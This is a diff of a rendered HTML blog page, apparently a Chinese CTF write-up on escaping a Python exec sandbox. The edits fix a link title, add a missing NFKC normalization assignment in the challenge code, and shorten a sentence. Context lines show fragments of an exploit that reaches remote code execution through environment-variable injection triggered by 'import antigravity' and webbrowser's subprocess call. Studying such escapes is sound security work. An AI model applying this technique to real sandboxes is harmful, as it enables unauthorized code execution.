@@ -2257,7 +2257,7 @@ dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs
 
 <span class="n">exec</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 </code></pre></div>
-<p>很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考<a href="https://www.elttam.com/blog/env/">## HACKING WITH ENVIRONMENT VARIABLES</a></p>
+<p>很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考<a href="https://www.elttam.com/blog/env/">HACKING WITH ENVIRONMENT VARIABLES</a></p>
 <p>我们这里先贴出最终的exp，然后再分析其原理:<br />
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
@@ -2279,7 +2279,7 @@ dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs
 <span class="s2">import antigravity</span>
 <span class="s2">&quot;&quot;&quot;</span> <span class="c1"># exp</span>
 
-<span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">=</span> <span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;h&quot;</span><span class="se">\&#39;</span><span class="s1">(@_&#39;</span><span class="p">:</span>
     <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
@@ -2384,7 +2384,7 @@ dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs
                 <span class="k">if</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                     <span class="n">register</span><span class="p">(</span><span class="n">cmdline</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="n">cmdline</span><span class="p">),</span> <span class="n">preferred</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 </code></pre></div></p>
-<p><code>GenericBrowser.open()</code>函数是我们最终的目的，其实际上调用了<code>subprocess.open()</code>函数来实现使用浏览器打开的目的:<br />
+<p><code>GenericBrowser.open()</code>函数是我们最终的目的，其调用了<code>subprocess.open()</code>函数:<br />
 <div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">GenericBrowser</span><span class="p">(</span><span class="n">BaseBrowser</span><span class="p">):</span>
     <span class="sd">&quot;&quot;&quot;Class for all browsers started with a command</span>
 <span class="sd">       and without remote functionality.&quot;&quot;&quot;</span>
@@ -2435,7 +2435,7 @@ dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs
 <span class="s2">import antigravity</span>
 <span class="s2">&quot;&quot;&quot;</span> <span class="c1"># exp</span>
 
-<span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">=</span> <span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;h&quot;</span><span class="se">\&#39;</span><span class="s1">(@_&#39;</span><span class="p">:</span>
     <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
